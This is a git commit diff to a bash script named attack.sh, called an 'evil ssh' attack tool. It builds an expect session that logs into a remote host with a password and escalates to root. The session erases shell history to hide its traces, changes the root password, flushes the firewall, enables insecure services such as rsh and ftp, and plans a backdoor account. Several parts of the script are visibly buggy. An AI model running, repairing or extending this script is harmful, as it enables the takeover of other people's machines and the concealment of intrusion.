ff71534911a7e2d6791c8c06fb97260a102ace11
bigshebang <ljm3103@rit.edu>
2014-03-09 03:05:35 -0400

    adding more functionality

--- attack.sh
+++ attack.sh
@@ -1,12 +1,21 @@
 #!/usr/bin/env bash
 #evil ssh; ssh attack tool
+# TO DO
+# remove login history when the "last" command is typed in
 
 if [ "$1" = "-h" -o "$1" = "--help" ]; then
 	echo "Usage: $0 [user@host] [password] [options]"
 	exit 0
 fi
 
+#variables - can be changed to meet different needs
+expectFile="connect.exp"
+serviceStop="iptables"
+serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
+newUser="sysd"
+newPass="Password!"
 port=22
+
 if [ $# -gt 0 ]; then
 	firstArg=$1
 	pass=$2
@@ -24,30 +33,57 @@ fi
 
 # echo "command would be ssh $firstArg -p $port"
 if [ "$user" == "root" ]; then
-	prefix=""
+	firstCmd="su"
 else
-	prefix="sudo "
+	firstCmd="sudo su"
+fi
 
 echo "attemping login"
 
-cat <<HEAD > connect.exp
+#switch to sh instead of bash or whatever default is
+
+/bin/cat <<HEAD > $expectFile
 #!/usr/bin/expect
 spawn ssh $firstArg
 #use correct prompt
 set prompt ":|#|\\\$"
 interact -o -nobuffer -re \$prompt return
 send "$pass\r"
-interact -o -nobuffer -re \$prompt return
-send "$prefixls\r"
-interact -o -nobuffer -re \$prompt return
-send "echo 'balls2' >> /tmp/file\r"
-interact -o -nobuffer -re \$prompt return
-send "$prefix/usr/bin/env iptables -F || $prefixipfw flush \r"
 HEAD
 
-cat <<BOTTOM >> connect.exp
+if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
+	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+	echo "send \"history -d `history | wc -l`; sudo su\" #make sure we don't leave a trail" >> $expectFile
+	echo "interact -o -nobuffer -re \"*assword*\" return" >> $expectFile
+	echo "send \"$pass\r\"" >> $expectFile
+fi
+
+/bin/cat<<MORE >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "exit\r"
+send "history -d `history | wc -l`; sh" #make sure we don't leave a trail
+interact -o -nobuffer -re \$prompt return
+send "echo -e \"\" | passwd\r" #change root password
+interact -o -nobuffer -re \$prompt return
+send "echo 'balls2' >> /tmp/file\r" #add 'backdoor' user
+interact -o -nobuffer -re \$prompt return
+send "/usr/bin/env iptables -F || ipfw flush \r"
+MORE
+
+#start certain services
+for service in serviceStart; do
+	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+	echo "send\"/usr/bin/env service $service start\r\" "
+done
+
+#stop certain services
+for service in serviceStop; do
+	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+	echo "send\"/usr/bin/env service $service stop\r\" "
+done
+
+/bin/cat <<BOTTOM >> $expectFile
+interact -o -nobuffer -re \$prompt return
+send "history -d `history | wc -l`; exit\r"
 interact
 BOTTOM
 
